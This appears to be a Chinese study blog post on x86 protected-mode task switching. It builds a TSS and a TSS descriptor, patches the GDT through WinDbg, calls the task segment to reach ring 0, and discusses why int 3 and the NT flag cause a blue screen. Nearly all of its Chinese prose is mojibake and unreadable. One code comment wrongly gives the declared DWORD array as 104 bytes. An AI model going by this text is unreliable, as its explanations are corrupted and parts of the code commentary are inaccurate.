æˆ‘ä»¬è‡ªå·±æ‰¾ä¸€å—å†…å­˜å½“ä½œTSSç”¨ï¼ŒCPUæ˜¯é€šè¿‡TRå¯„å­˜å™¨æ¥æ‰¾åˆ°TSSçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹TRå¯„å­˜å™¨çš„å€¼ã€‚è€ŒTRå¯„å­˜å™¨çš„å€¼æ˜¯æ¥è‡ªäºTSSæ®µæè¿°ç¬¦ï¼Œæ‰€ä»¥TSSæ®µæè¿°ç¬¦ä¹Ÿè¦æˆ‘ä»¬è‡ªå·±æ„é€ ã€‚ æ³¨æ„ï¼šæ„é€ TSSæ®µæè¿°ç¬¦æ—¶Gä½è¦ä¸º0ï¼Œå› ä¸ºè¿™ä¸ªæè¿°ç¬¦æŒ‡å‘çš„TSSæ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ã€‚ ä¿®æ”¹TRå¯„å­˜å™¨ åœ¨Ring0æˆ‘ä»¬å¯ä»¥é€šè¿‡LTRæŒ‡ä»¤å»ä¿®æ”¹TRå¯„å­˜å™¨ åœ¨Ring3æˆ‘ä»¬å¯ä»¥é€šè¿‡CALL FARæˆ–è€…JMP FARæŒ‡ä»¤æ¥ä¿®æ”¹ ç”¨JMPå»è®¿é—®ä¸€ä¸ªä»£ç æ®µçš„æ—¶å€™,æ”¹å˜çš„æ˜¯CSå’ŒEIP:æ¯”å¦‚JMP 0x480x123456ï¼Œå¦‚æœ0x48æ˜¯ä»£ç æ®µï¼Œæ‰§è¡Œå:CSâ€“&gt;0x48 EIPâ€“&gt;0x123456 ç”¨JMPå»è®¿é—´ä¸€ä¸ªä»»åŠ¡æ®µçš„æ—¶å€™ï¼šå¦‚æœ0x48æ˜¯TSSæ®µæè¿°ç¬¦,å…ˆä¿®æ”¹TRå¯„å­˜å™¨,å†ç”¨TR.BaseæŒ‡å‘çš„TSSä¸­çš„å€¼ä¿®æ”¹å½“å‰çš„å¯„å­˜å™¨ æ³¨æ„ï¼š Ring0ä¸­ç”¨LTRæŒ‡ä»¤ï¼Œåªæ”¹äº†TRå¯„å­˜å™¨ï¼Œæ²¡æ”¹TSS JMP ä»»åŠ¡æ®µæˆ–CALL ä»»åŠ¡æ®µçš„æ–¹å¼ï¼Œä¸ä»…æ”¹äº†TRå¯„å­˜å™¨ï¼Œè¿˜ç”¨TSSæ”¹äº†å¯„å­˜å™¨ ä»£ç æ¨¡æ¿ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func()&#123; dwOK=1; __asm &#123; int 3; mov eax,esp; mov dwESP,eax; mov word ptr [dwCS],cs; //å›å»çš„ä»£ç è‡ªå·±å†™ã€‚å› ä¸ºjmp ä»£ç æ®µå’Œcallä»£ç æ®µå›å»çš„ä»£ç ä¸åŒ &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; printf(&quot;input CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 //ä¸‹ä¸€æ­¥æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„linkï¼Œåœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3ç¯ï¼š0x1B 0x00000010, //ss * 3ç¯ï¼š0x23 0x00000023, //ds * 0x00000030, //fs * 3ç¯ï¼š0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; char buffer[6];//æ„é€ ä»»åŠ¡æ®µ *(DWORD*)(&amp;buffer[0])=0x12345678; *(WORD*)(&amp;buffer[4])=0x88; //è¿™ä¸ªç›®å‰æ˜¯ä¹±å†™çš„ï¼Œè¦æ”¹ __asm &#123; call fword ptr [buffer]; &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125; å˜é‡tsså¤§å°0x68ï¼Œå³104å­—èŠ‚ã€‚æ˜¯è‡ªå·±æ„é€ çš„TSSï¼Œé‡Œé¢å¡«ä¸Šæ‰€æœ‰å¯„å­˜å™¨çš„å€¼ã€‚ TSSå¯ä»¥ä½¿ç”¨æ•°ç»„ï¼Œä¹Ÿå¯ä»¥VirtualAllocï¼Œå»ºè®®åè€…ï¼Œå› ä¸ºç™½çš®ä¹¦è¯´tssè¦åœ¨ä¸€ä¸ªå†…å­˜é¡µæˆ–è€…è¿ç»­çš„å†…å­˜é¡µã€‚ç”¨æ•°ç»„è“äº†çš„è¯é‡æ¥ä¸€æ¬¡ï¼Œä½†å®é™…è¿‡ç¨‹ä¸­æˆ‘ç”¨æ•°ç»„æˆ‘æ²¡é‡åˆ°è¿‡ å¿…å¡«çš„æ³¨é‡Šæœ‰*å·ï¼Œéå¿…å¡«çš„æ³¨é‡Šæ²¡ã€‚ linkå­—æ®µï¼Œå½“ä½ ä¸€æ¬¡æ€§åˆ‡æ¢ä¸€å †å¯„å­˜å™¨æ—¶ï¼Œè¿™ä¸ªåœ°æ–¹å­˜å‚¨çš„å°±æ˜¯ä½ ä¸Šä¸€æ¬¡ä»»åŠ¡åŸæ¥104å­—èŠ‚çš„æ®µé€‰æ‹©å­ã€‚å½“å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶ï¼Œä¼šç”±ç¡¬ä»¶CPUè‡ªåŠ¨å¡«å……ã€‚ 3ç»„espå’Œssï¼Œå› ä¸ºæœ¬æ¬¡å®éªŒæ˜¯3ç¯è¿›0ç¯ï¼Œæ²¡ç”¨åˆ°ï¼Œæ‰€ä»¥éƒ½å†™0ã€‚ CR3çš„å€¼ï¼ˆç›®å‰ä¸è§£é‡Šï¼Œåé¢è®²åˆ°é¡µçš„çŸ¥è¯†åœ¨è®²ï¼‰ï¼Œåœ¨è¿è¡Œè¯¥exeåï¼Œä½¿ç”¨windbgä¸‹æ–­ç‚¹ï¼Œä½¿ç”¨!process 0 0æŒ‡ä»¤ï¼Œæ‰¾åˆ°è¯¥exeåç§°é‚£æ ï¼Œè·å¾—cr3çš„å€¼ã€‚ eipæ˜¯åˆ‡æ¢åï¼Œæ¥ç€æ‰§è¡Œçš„ä»£ç åœ°å€ã€‚ gså¯„å­˜å™¨ï¼Œwindowsæ²¡æœ‰ä½¿ç”¨ï¼Œæ°¸è¿œæ˜¯0. ldtæ°¸è¿œæ˜¯0ã€‚ csã€ssã€fsä»£ç ç›®å‰å†™æ˜¯è·³0ç¯åçš„å€¼ï¼Œå¦‚æœæ˜¯3ç¯é€šè¿‡TSSè·³3ç¯ï¼Œè¿™ä¸‰ä¸ªçš„å€¼æ”¹æˆæ³¨é‡Šçš„å€¼ã€‚ esã€dsæ— è®º3ç¯è¿˜æ˜¯0ç¯ï¼Œéƒ½æ˜¯0x23ã€‚ tssæœ€åä¸€é¡¹ï¼Œè¿™ä¸ªå­—æ®µå«IOæƒé™ä½å›¾ï¼ŒWindows 2000ä¹‹åä¸å†ä½¿ç”¨äº†ï¼Œä½†TSSç»“æ„ä½“è¦æœ‰è¿™ä¸ªå€¼ã€‚æ‰€ä»¥ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥0x20ac0000ç›´æ¥è´´åœ¨è¿™ã€‚ stackæ˜¯è‡ªå·±å®šä¹‰çš„ä¸€ä¸ªå˜é‡ï¼Œæœªæ¥å°†å®ƒçš„å†…å­˜æ‹¿æ¥å½“å †æ ˆä½¿ç”¨ã€‚å †æ ˆä»é«˜åœ°å€å¼€å§‹ä½¿ç”¨ï¼Œæ‰€ä»¥tssæ•°ç»„é‡Œstack+äº†100 funcå‡½æ•°é‡Œè¿”å›çš„ä»£ç æ²¡å†™ï¼Œè¿™å–å†³äºè°ƒç”¨æ—¶æ˜¯jmpè¿˜æ˜¯callè°ƒç”¨ã€‚è¿™ä¸¤ç§è°ƒç”¨æ–¹å¼è¿›æ¥funcï¼Œè¿”å›éƒ¨é—¨çš„ä»£ç ä¸ä¸€æ ·ï¼Œè‡ªå·±åšä¸€ä¸‹ã€‚ æ­¥éª¤ï¼š æ„é€ TSSçš„104å­—èŠ‚ å‡†å¤‡å¥½TSSæ®µæè¿°ç¬¦ï¼Œå†™åˆ°GDTè¡¨é‡Œ ä½¿ç”¨jmp/call ä»»åŠ¡æ®µï¼Œä¿®æ”¹TRå¯„å­˜å™¨ åé¢æ–‡ç« å†…å®¹é€šç”¨éƒ¨åˆ†ï¼šæ„é€ TSSæ®µæè¿°ç¬¦BaseæŒ‡ç¤ºäº†TSSè¡¨çš„ä½ç½®ï¼ˆå°±æ˜¯æˆ‘ä»¬è‡ªå·±è¦åˆ‡æ¢åˆ°çš„TSSè¡¨çš„ä½ç½®ï¼Œå°±æ˜¯ç¨‹åºä¸­æˆ‘ä»¬çš„tssæ•°ç»„ï¼Œå³tssæ•°ç»„çš„èµ·å§‹åœ°å€ï¼‰ã€‚LimitæŒ‡ç¤ºäº†TSSè¡¨æœ‰å¤šå¤§ï¼ˆæ²¡æœ‰ç‰¹æ®Šè®¾ç½®å°±è®¾ç½®æˆ0x68ï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶çš„104ï¼Œå…¶å®æ›´å¤§ä¸€äº›ä¹Ÿæ²¡å…³ç³»ï¼‰ã€‚Baseå‡è®¾æ˜¯0x0012FDE0ã€‚Base31:24 ï¼š00Gï¼š0ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½00AVLï¼š0Limit19:16ï¼š0Pï¼š1DPLï¼š110Typeï¼š9ï¼Œå³1001ã€‚Bä½ä¸º0ï¼Œè¡¨å½“å‰TSSæ®µæè¿°ç¬¦æ²¡åŠ è½½åˆ°TRå¯„å­˜å™¨ä¸­ã€‚Base23:16ï¼š12ã€‚ç¨‹åºè¾“å‡ºæ‰“å°çš„tssæ•°ç»„åœ°å€çš„ä¸€éƒ¨åˆ†ã€‚Base Address 15:00ï¼šfde0ã€‚ç¨‹åºè¾“å‡ºæ‰“å°çš„tssæ•°ç»„åœ°å€çš„ä¸€éƒ¨åˆ†ã€‚Segment Limit 15:00ï¼š0068ã€‚ç»¼ä¸Šï¼Œæ„é€ çš„ä»»åŠ¡æ®µæ®µæè¿°ç¬¦æ˜¯ï¼š0000E912`fde00068ä¸‹åˆ’çº¿éƒ¨åˆ†æ˜¯tssæ•°ç»„åœ°å€ï¼Œæˆ‘ç”¨ä»£ç è¾“å‡ºåˆ°ç»ˆç«¯ï¼Œå°±ä¸ç”¨æ¯æ¬¡éƒ½è°ƒè¯•æŸ¥çœ‹123456789101112// Print the address of the tss array in hexadecimal formprintf(&quot;Address of the tss array: %p &quot;, tss);// Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array addressprintf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF);printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss);ä»£ç åˆ†æ%02x 00e9 %02x%04x 0068%02x: ä»¥åå…­è¿›åˆ¶è¾“å‡ºï¼Œæœ€å°‘ä¸¤ä½ï¼Œä¸è¶³è¡¥é›¶ã€‚%04x: ä»¥åå…­è¿›åˆ¶è¾“å‡ºï¼Œæœ€å°‘å››ä½ï¼Œä¸è¶³è¡¥é›¶ã€‚(DWORD)tss &gt;&gt; 28å¾—åˆ°tssåœ°å€çš„é«˜ä¸¤ä½åå…­è¿›åˆ¶æ•°((DWORD)tss &gt;&gt; 16) &amp; 0x000000FFå¾—åˆ°tssåœ°å€çš„é«˜ç¬¬3å’Œç¬¬4ä½åå…­è¿›åˆ¶æ•°(DWORD)tss &amp; 0x0000FFFF)æˆ–(WORD)tss)å¾—åˆ°tssåœ°å€çš„ä½4ä½åå…­è¿›åˆ¶æ•°æµ‹è¯•ç¨‹åºè¿è¡Œç¤ºæ„ï¼š è°ƒè¯•æç¤ºå¦‚æœå¤šæ¬¡è¿è¡Œï¼Œwindbgç”¨!process 0 0çœ‹æ—¶ä¼šæœ‰å¤šä¸ªxxx.exeï¼Œç”¨æœ€åä¸€è¡Œçš„CR3 call ä»»åŠ¡æ®µæµ‹è¯•ä»£ç è¿è¡Œè°ƒè¯•C89å˜é‡å£°æ˜æŠ¥é”™é—®é¢˜åœ¨ANSI C99ä¹‹å‰ï¼Œå˜é‡çš„å£°æ˜å¿…é¡»æ”¾åœ¨å…¶å®ƒè¯­å¥ä¹‹å‰ï¼Œå¦åˆ™C99ä»¥å‰çš„ç¼–è¯‘å™¨å°±ä¼šæŠ¥é”™ã€‚æˆ‘é‡åˆ°çš„æŠ¥é”™å¦‚ï¼š123456789101112C:\\CODE\\tss_array\\main.c(30) : error C2275: &#x27;DWORD&#x27; : illegal use of this type as an expressionc:\\program files\\microsoft visual studio\\vc98\\include\\windef.h(141) : see declaration of &#x27;DWORD&#x27;C:\\CODE\\tss_array\\main.c(30) : error C2146: syntax error : missing &#x27;;&#x27; before identifier &#x27;tss&#x27;C:\\CODE\\tss_array\\main.c(30) : error C2065: &#x27;tss&#x27; : undeclared identifierC:\\CODE\\tss_array\\main.c(30) : error C2109: subscript requires array or pointer typeC:\\CODE\\tss_array\\main.c(30) : error C2059: syntax error : &#x27;&#123;&#x27;C:\\CODE\\tss_array\\main.c(72) : error C2143: syntax error : missing &#x27;;&#x27; before &#x27;type&#x27;C:\\CODE\\tss_array\\main.c(73) : error C2065: &#x27;buffer&#x27; : undeclared identifierC:\\CODE\\tss_array\\main.c(73) : error C2109: subscript requires array or pointer typeC:\\CODE\\tss_array\\main.c(73) : error C2102: &#x27;&amp;&#x27; requires l-valueC:\\CODE\\tss_array\\main.c(74) : error C2109: subscript requires array or pointer typeC:\\CODE\\tss_array\\main.c(74) : error C2102: &#x27;&amp;&#x27; requires l-value1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd //callæ–¹å¼è¿”å› &#125;&#125;int main()&#123; char buffer[6]; //æ„é€ ä»»åŠ¡æ®µ char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; //æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„TRæ®µé€‰æ‹©å­ã€‚åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3ç¯ï¼š0x1B 0x00000010, //ss * 3ç¯ï¼š0x23 0x00000023, //ds * 0x00000030, //fs * 3ç¯ï¼š0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; //è¾“å‡ºçœ‹((DWORD)stack) + 100çš„åœ°å€ï¼Œåé¢ç”¨windbgçœ‹ä»»åŠ¡åˆ‡æ¢çš„espä½œå¯¹æ¯”ç”¨ printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //ä¿®æ”¹GDTè¡¨ printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //å› ä¸ºå˜é‡å£°æ˜é¡ºåºçš„é—®é¢˜ï¼Œè¾“å…¥cr3çš„è¯­å¥åœ¨è¿™é‡Œã€‚ç„¶åå†èµ‹ç»™tssæ•°ç»„é‡Œçš„cr3å­—æ®µ printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 tss[7]=cr3; *(DWORD*)(&amp;buffer[0])=0x12345678; *(WORD*)(&amp;buffer[4])=0x48; //æ®µé€‰æ‹©å­0x48ï¼Œæ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯8003f048 __asm &#123; call fword ptr [buffer]; &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;ä¿®æ”¹çš„æ˜¯GDTè¡¨ï¼Œ8003f048å¯¹åº”çš„æ®µé€‰æ‹©å­æ˜¯0x48ï¼Œæ‰€ä»¥callçš„CSæ˜¯0x48æ‰§è¡Œexeï¼Œæ ¹æ®ç»ˆç«¯è¾“å‡ºï¼Œwindbgä¸‹breakï¼Œä¿®æ”¹GDTè¡¨ä½¿ç”¨!process 0 0æŸ¥çœ‹è¯¥exeçš„DirBaseï¼Œè¾“å…¥åˆ°ç»ˆç«¯12345678910111213kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0000e912`fd700068kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd700068è¿è¡ŒæˆåŠŸï¼Œæ‰§è¡Œè¿‡ç¨‹æ²¡é‡åˆ°é”™è¯¯ç›´æ¥åŠ int 3åœ¨int 3åå°†NTä½å¤åŸint 3 åæ¢å¤åŸæ¥eflçš„å€¼1234567891011121314void __declspec(naked) func() &#123; dwOK=1; __asm &#123;+ int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd //callæ–¹å¼è¿”å› &#125;&#125;ç„¶åæ‰§è¡Œï¼Œå› ä¸ºint 3ï¼Œæ‰€ä»¥ä¼šæ–­åœ¨windbgã€‚å¯ä»¥çœ‹åˆ°å¯„å­˜å™¨éƒ½åˆ‡æ¢äº†å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†eflæ˜¯4002ï¼Œä¸æ˜¯æˆ‘è®¾çš„0ã€‚å…¶ä»–éƒ½ä¿®æ”¹äº†ã€‚å› ä¸ºè·³åˆ°äº†funcæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ‰€ä»¥eipæ˜¯è¢«ä¿®æ”¹ä¸ºæˆ‘è®¾çš„å€¼ã€‚espæ˜¯è®¾å®šçš„stack+100ï¼Œç»ˆç«¯æœ‰è¾“å‡ºï¼Œå¯ä»¥å¯¹åº”åˆ°ã€‚æ³¨æ„eflï¼Œç°åœ¨æ˜¯0100 0000 0000 0010ï¼Œç¬¬14ä½ï¼ŒNTä½ä¸º1ã€‚ç„¶åæ³¨æ„ä¸‹ï¼Œå¦‚æœè¾“å…¥æŒ‡ä»¤på•æ­¥æ‰§è¡Œï¼Œä¼šä¸€ç›´busyè¾“å…¥æŒ‡ä»¤gï¼Œå¦‚æœèƒ½å›åˆ°VCï¼Œå°±æ²¡é—®é¢˜ã€‚ä½†æ˜¯è¾“å…¥æŒ‡ä»¤gåä¼šè“å±ä¸ºä»€ä¹ˆï¼Ÿint 3ç©¶ç«Ÿåšäº†ä»€ä¹ˆå¯¼è‡´äº†è“å±åŸå› ä¸EFLAGSçš„åµŒå¥—ä»»åŠ¡æ ‡å¿—NTï¼ˆNested Taskï¼‰æœ‰å…³ï¼Œå®ƒæ˜¯ç”¨æ¥æ§åˆ¶ä¸­æ–­è¿”å›æŒ‡ä»¤IRETçš„æ‰§è¡Œã€‚NTçš„å€¼å«ä¹‰0ç”¨å †æ ˆä¸­ä¿å­˜çš„å€¼æ¢å¤SSã€ESPã€EFLAGSã€CSå’ŒEIPï¼Œæ‰§è¡Œå¸¸è§„çš„ä¸­æ–­è¿”å›æ“ä½œ1é€šè¿‡ä»»åŠ¡è½¬æ¢å®ç°ä¸­æ–­è¿”å›eflç¬¬14ä½ï¼ŒNTä½æ— è®ºä»»ä½•æ—¶å€™å¤„ç†å™¨ç¢°åˆ°iretæŒ‡ä»¤ï¼Œéƒ½è¦æ£€æŸ¥NTä½ï¼Œå¦‚æœæ­¤ä½æ˜¯ 0ï¼Œè¡¨æ˜æ˜¯ä¸€èˆ¬çš„ä¸­æ–­è¿‡ç¨‹ï¼ŒæŒ‰ä¸€èˆ¬çš„ä¸­æ–­è¿”å›å¤„ç†ï¼Œå³ï¼Œä¸­æ–­è¿”å›æ˜¯ä»»åŠ¡å†…çš„ï¼ˆä¸­æ–­å¤„ç†è¿‡ç¨‹è™½ç„¶å±äºæ“ä½œç³»ç»Ÿï¼Œä½†å±äºä»»åŠ¡çš„å…¨å±€ç©ºé—´ï¼‰ï¼›å¦‚æœæ­¤ä½æ˜¯ 1ï¼Œåˆ™è¡¨æ˜å½“å‰ä»»åŠ¡ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ­£åœ¨æ‰§è¡Œï¼Œæ˜¯å› ä¸ºä¸­æ–­äº†åˆ«çš„ä»»åŠ¡ã€‚å› æ­¤ï¼Œåº”å½“è¿”å›åŸå…ˆè¢«ä¸­æ–­çš„ä»»åŠ¡ç»§ç»­æ‰§è¡Œã€‚è¿™æ®µè¯ä½œäº†æ‹“å±•ï¼Œéœ€è¦æœªæ¥ç»§ç»­å­¦ä¹ ï¼Œè¿™é‡Œæµ…æµ…çœ‹ä¸‹å°±è¡Œã€‚å‚è€ƒè¿æ¥ï¼šã€Šx86 æ±‡ç¼–è¯­è¨€ï¼šä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼ï¼ˆç¬¬2ç‰ˆï¼‰ã€‹è¯»ä¹¦ç¬”è®°ï¼ˆç¬¬ 12-20 ç« ï¼‰æ²¡åŠ int 3æ—¶ï¼Œcall ä»»åŠ¡æ®µè¿›æ¥ï¼Œä¼šå°†NTä½ç½®1ã€‚è¿”å›æ—¶iretdï¼Œæ­¤æ—¶NTä½ä¸º1ï¼Œå°±å›å»æ‰¾å‰ä¸€ä¸ªä»»åŠ¡çš„æŒ‡é’ˆï¼ˆTSSé‡Œçš„Previous Task Linkå­—æ®µï¼‰ã€‚è€Œæ‰§è¡Œint 3åï¼Œç»ˆç«¯æŒ‡ä»¤å°†NTä½ç½®0äº†ï¼Œè¿”å›æ—¶iretdï¼Œæ­¤æ—¶NTä½ä¸º0ï¼Œå°±å›å»ä»å †æ ˆæ‰¾å€¼å¼¹æ ˆè¿”å›ï¼Œå¯¼è‡´è“å±ã€‚æ‰€ä»¥ï¼šint 3æ”¹å˜äº†NTä½æ ‡è¯†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨int 3ä¹‹åå†é‡æ–°å°†NTä½å¤åŸï¼Œè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥æ­£ç¡®è¿”å›çš„ã€‚ä½†æˆ‘è¿˜çœ‹åˆ°ä¸€ç§è¯´æ³•æ˜¯å› ä¸ºfså˜äº†ï¼Œæ”¹fsä¹Ÿèƒ½æ­£å¸¸è¿”å›ã€‚ä½†æˆ‘è¯•äº†ä¸‹è¿™ä¸ªè¯´æ³•åšå®¢è´´çš„ä»£ç ï¼Œå‘ç°èµ·ä½œç”¨çš„ä¸æ˜¯fsçš„åŸå› ï¼Œè¿™ä¸ªåœ¨ç¬¬äºŒç§æ–¹å¼ç»†è®²ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://www.braveenough.cn/2021/12/15/ä¿æŠ¤æ¨¡å¼/#toc-heading-58ä»»åŠ¡æ®µç« æ ¸å¿ƒä»£ç ï¼š1234567891011121314151617181920212223void __declspec(naked) func() &#123; dwOK=1; __asm &#123; int 3 //è°ƒç”¨int 3åå°†NTä½ç½®1 pushfd pop eax or eax,0x4000 //oræˆ–ã€‚0000 0000 0000 0000 0100 0000 0000 0000 //0x4000 push eax popfd mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd //callæ–¹å¼è¿”å› &#125;&#125;æ–­åœ¨windbgåï¼Œè¾“å…¥æŒ‡ä»¤gï¼Œèƒ½å›åˆ°3ç¯ã€‚int 3åœ¨windbgä¸­æ–­ä¸‹åï¼Œè°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°eflç”±4002å˜æˆäº†2ï¼ŒNTä½ç”±1åˆ°0äº†ã€‚ç„¶åæˆ‘ä»¬çš„ä»£ç å°†NTä½ç½®1ï¼Œeflåˆå˜æˆ4002ã€‚ä½†æ˜¯æœ€åå½“ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯iretdæ—¶ï¼Œè¾“å…¥æŒ‡ä»¤pæˆ–æŒ‡ä»¤géƒ½ä¼šè“å±ï¼Œè¿™é‡Œæˆ‘ä¸æ‡‚äº†ã€‚ä½†æ˜¯å¦‚æœint 3ä¸€æ–­è¿›æ¥ï¼Œç„¶åè¾“å…¥gï¼Œæ˜¯èƒ½å›åˆ°3ç¯çš„ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/Kwansy/article/details/108890586ä¸Šé¢é“¾æ¥åšå®¢é‡Œçš„ä»£ç æ˜¯è¿™æ ·çš„ï¼š123456789101112131415161718192021222324// ä»»åŠ¡åˆ‡æ¢åçš„EIPvoid __declspec(naked) R0Func()&#123;\t__asm\t&#123; pushad pushfd push fs int 3 // int 3 ä¼šä¿®æ”¹FS pop fs mov eax,1 mov dword ptr ds:[dwOk],eax mov eax,esp mov dword ptr ds:[dwESP],eax mov ax,cs mov word ptr ds:[dwCS],ax popfd popad iretd\t&#125;&#125;å®é™…ä¸Šèµ·ä½œç”¨èƒ½è¿”å›çš„åŸå› æ˜¯int 3å‰é¢çš„pushfdå’Œä¹‹åçš„popfdæˆ‘è¯•äº†åªæœ‰æˆå¯¹çš„push fså’Œpop fsï¼Œæ˜¯æ²¡æ³•è¿”å›çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š12345678910111213141516171819void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //æ‰‹åŠ¨ä¿å­˜int 3å‰fsçš„å€¼ push fs int 3 pop fs mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs 